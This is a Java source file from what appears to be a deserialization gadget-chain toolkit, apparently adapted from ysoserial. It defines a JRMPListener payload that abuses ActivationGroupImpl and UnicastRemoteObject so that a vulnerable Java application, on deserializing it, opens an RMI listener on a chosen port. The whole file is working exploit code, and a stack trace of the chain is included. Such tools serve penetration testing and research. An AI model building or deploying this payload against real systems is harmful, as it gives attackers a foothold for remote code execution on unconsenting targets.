package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.ses.gadgetbuilder.util.Reflections;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastServerRef;

import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

@Authors({ Authors.MBECHLER })
@Dependencies({})
@Impact(Impact.JRMPListener)
public class JRMPListener extends GadgetChain<NoTrampoline> {

    public JRMPListener() {
        super(NoTrampoline.getInstance());
    }

    public JRMPListener(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        int jrmpPort = Integer.parseInt(command);
        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
                RemoteRef.class
        }, new Object[] {
                new UnicastServerRef(jrmpPort)
        });

        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
        return new TrampolineConnector(uro);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getCommandFormat() {
        return "<port>";
    }

    @Override
    protected String getStackTrace() {
        return "sun.rmi.server.UnicastRemoteObject.readObject()\n"+
                "sun.rmi.server.UnicastRemoteObject.reexport()\n"+
                "sun.rmi.server.UnicastRemoteObject.exportObject(Remote, int)\n"+
                "sun.rmi.server.UnicastRemoteObject.exportObject(Remote, UnicastServerRef)\n"+
                "sun.rmi.server.UnicastServerRef.exportObject()\n"+
                "sun.rmi.transport.LiveRef.exportObject()\n"+
                "sun.rmi.transport.tcp.TCPEndpoint.exportObject\n" +
                "sun.rmi.transport.tcp.TCPTransport.exportObject()\n"+
                "sun.rmi.transport.tcp.TCPTransport.listen()\n";
    }
}
